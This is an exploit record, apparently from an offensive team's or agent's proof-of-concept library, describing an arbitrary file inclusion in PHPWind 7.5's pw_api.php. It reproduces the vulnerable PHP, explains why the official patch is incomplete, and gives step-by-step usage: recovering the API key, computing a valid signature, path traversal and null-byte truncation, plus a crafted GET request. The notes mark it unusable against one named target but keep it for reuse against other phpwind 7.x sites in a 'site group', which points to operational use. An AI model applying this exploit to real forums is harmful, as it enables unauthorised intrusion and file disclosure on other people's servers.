# PHPWind 7.5 pw_api.php → api/class_base.php $mode 未过滤任意文件包含（来自 $_POST+$_GET，不依赖 register_globals）

- **code**: phpwind-7.5-pw_api.php-api-class_base.php-mode-未过滤任意文件包含-来自-_post-_get-不依赖-regis
- **kind**: poc
- **category**: rce
- **component**: PHPWind
- **versions**: 7.5（7.x 分支；官方 2010 年已发补丁，但补丁不完备）
- **severity**: critical
- **language**: http
- **source**: web
- **source_url**: https://blog.csdn.net/weixin_39912163/article/details/116077547
- **verified_note**: 未在目标实测（情报角色零请求）。**本条在 moh6hrwx4t 上已判定不可用**：任务给定前提「UCenter/windid/api 接口全 404，本版本不集成 UCenter」。保留作站群其它 phpwind 7.x 复用。
- **path**: pocs/phpwind-7.5-pw_api.php-api-class_base.php-mode-未过滤任意文件包含-来自-_post-_get-不依赖-regis/poc.http
- **created_at**: 2026-10-06T11:26:33.974Z
- **found_by**: exploit

## 描述

PHPWind 7.5 的 pw_api.php 把 $_POST+$_GET 整体交给 api_client::run()，其中 $mode 未过滤直接拼进 require_once(R_P.'api/class_'.$mode.'.php')，构成任意文件包含。与其他老洞不同，本链的变量来自 $_POST+$_GET（不是 register_globals），因此在 PHP 5.5 上仍可能成立；唯一门槛是 sig 校验 md5($arg.$apikey) 需自洽，而 apikey 取 $GLOBALS['uc_key']（type=uc）或 $GLOBALS['db_siteownerid']。官方补丁（Pcv）只过滤了 'http://' 与 '..'，并不完备。

## 用法

```
1) 前置：确认 /api/ 目录存在（本目标已排除：全 404，不适用）。
2) 取 apikey：浏览器/接口里找 db_siteownerid；或试 type=uc 用 uc_key。
3) 自算 sig：ksort($_GET+$_POST) → 拼接 "key=value&"（跳过 sig 与空值）→ md5($arg.$apikey)。
4) 打包含：
   GET /pw_api.php?type=uc&mode=../../data/bbscache/bank_sort&method=&params=&sig=<自算> HTTP/1.1
   mode 支持路径穿越；老 PHP(<5.3.4) 可直接 %00 截断包含任意文件。
5) 目标回显 Error Sign → sig 算错（apikey 不对）；返回 Class(xxx) Not Exists → sig 过了，file_exists 没通过，继续调穿越深度。

【EXP 落盘】runs/pw-exp/01-phpwind73x-vuln-list.md 第 3 节
```

## 正文

```
### PHPWind 7.5 pw_api.php -> api/class_base.php 本地文件包含（不依赖 register_globals）

# 入口：pw_api.php
$api = new api_client();
$response = $api->run($_POST + $_GET);   // 直接吃 $_POST/$_GET

# api/class_base.php : run()
function run($request) {
    $request = $this->strips($request);                 // strips() 内部 stripslashes() -> 顺带绕过魔术引号
    if (isset($request['type']) && $request['type'] == 'uc') {
        $this->type = 'uc';
        $this->apikey = $GLOBALS['uc_key'];
    } else {
        $this->type = 'app';
        $this->apikey = $GLOBALS['db_siteownerid'];
        $this->siteappkey = $GLOBALS['db_siteappkey'];
    }
    ksort($request); reset($request);
    $arg = '';
    foreach ($request as $key => $value) { if ($value && $key != 'sig') { $arg .= "$key=$value&"; } }
    if (md5($arg . $this->apikey) != $request['sig']) {     // <== sig 必须自洽
        return new ErrorMsg(API_SIGN_ERROR, 'Error Sign');
    }
    $mode    = $request['mode'];                            // <== 未过滤
    $method  = $request['method'];
    $params  = isset($request['params']) ? unserialize($request['params']) : array();
    return $this->callback($mode, $method, $params);
}

# api/class_base.php : callback()
function callback($mode, $method, $params) {
    if (!isset($this->classdb[$mode])) {
        if (!file_exists(R_P.'api/class_'.$mode.'.php')) return new ErrorMsg(API_MODE_NOT_EXISTS, "Class($mode) Not Exists");
        require_once(R_P.'api/class_'.$mode.'.php');        // <== 包含点，$mode 直接拼接
        $this->classdb[$mode] = new $mode($this);
    }
    ...
}

# 官方补丁（phpwind.net/read-htm-tid-914851.html）
require_once Pcv(R_P.'api/class_'.$mode.'.php');
function Pcv($filename,$ifcheck=1){
    $tmpname = strtolower($filename);
    $tmparray = array('http://','');
    $ifcheck && $tmparray[] = '..';
    if (str_replace($tmparray,'',$tmpname)!=$tmpname) exit('Forbidden');
    return $filename;
}
# 注意补丁只挡了 'http://' 与 '..'（未挡 ftp://、php:// 等），8.7 系用 S::escapePath 拦 '://'、"\0"、'..'

### 利用要点
# 1) 先确定 apikey：type=uc 时 apikey=$GLOBALS['uc_key']，否则 $GLOBALS['db_siteownerid']
#    db_siteownerid 是站点 ID，可能在前台页面/JS/接口响应中泄露；uc_key 在老版本常可从 config 泄露。
# 2) 自己构造 $arg 并算 sig：ksort 后逐项 "$key=$value&"，注意排除 sig 与空值，最后 md5($arg.$apikey)
# 3) mode 指向已存在文件即可绕过 file_exists 前置，再用 php://filter / 截断 / %00 变形包含本地文件
#    典型：
GET /pw_api.php?mode=../../data/bbscache/bank_sort&method=x&type=uc&sig=<自算> HTTP/1.1
#    （PHP<5.3 可 %00 截断；5.3+ 用路径穿越到已存在的 .php）

### 目标适用性（重要，避免白打）
# 目标 /bbs/api/ 全目录 404（本版本不集成 UCenter）→ 本链在 moh6hrwx4t 上不可用，仅作站群其它 phpwind 7.x 复用。

```
